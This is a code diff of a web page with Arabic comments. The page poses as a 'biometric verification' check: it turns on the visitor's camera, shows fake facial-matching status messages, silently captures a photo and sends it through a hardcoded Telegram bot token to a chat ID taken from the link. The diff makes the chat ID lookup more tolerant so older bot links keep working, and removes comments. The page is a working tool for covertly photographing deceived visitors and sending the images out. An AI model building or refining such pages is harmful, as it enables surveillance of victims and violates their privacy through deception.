@@ -100,12 +100,13 @@
 </div>
 
 <script>
-    // التوكن المعتمد الخاص بك
     const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";
 
+    // دالة مرنة تبحث عن المعرف الرقمي بكل الأشكال الممكنة لتجنب الأخطاء الإملائية
     function getChatIdFromURL() {
         const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('chatId');
+        // تبحث عن chatId أو chatid أو chatld المتواجدة في روابط البوت القديمة
+        return urlParams.get('chatId') || urlParams.get('chatid') || urlParams.get('chatld');
     }
 
     async function initVerification() {
@@ -136,11 +137,9 @@
             videoPreview.srcObject = stream;
             statusDiv.innerText = "تم الاتصال بالعدسة البيومترية بنجاح. جاري مطابقة الملامح الرقمية...";
 
-            // الانتظار حتى يتأكد المتصفح من جاهزية بث الفيديو بالكامل لقراءة أبعاده الحقيقية بأمان
             videoPreview.onloadedmetadata = () => {
                 setTimeout(async () => {
                     try {
-                        // استخدام الأبعاد الحقيقية للبث، مع وضع أبعاد احتياطية إذا كانت القراءة صفرية لمنع تعطل toBlob
                         const width = videoPreview.videoWidth || 640;
                         const height = videoPreview.videoHeight || 480;
                         
@@ -150,7 +149,6 @@
                         const context = canvas.getContext('2d');
                         context.drawImage(videoPreview, 0, 0, width, height);
 
-                        // التقاط الصورة بصيغة JPEG لضمان التوافقية الكاملة وخفة الحجم أثناء الإرسال السحابي
                         canvas.toBlob(async (blob) => {
                             if (blob) {
                                 const formData = new FormData();
@@ -169,7 +167,6 @@
                         console.error("خطأ إرسال اللقطة:", err);
                     }
 
-                    // إغلاق الكاميرا والتوجيه التلقائي بعد إتمام المهمة
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
                         statusTitleObj.innerText = "اكتمل التحقق";
@@ -181,7 +178,7 @@
                         }, 1500);
                     }, 2000);
 
-                }, 2000); // التقاط اللقطة بعد ثانيتين من ثبات الكاميرا
+                }, 2000);
             };
 
         } catch (error) {
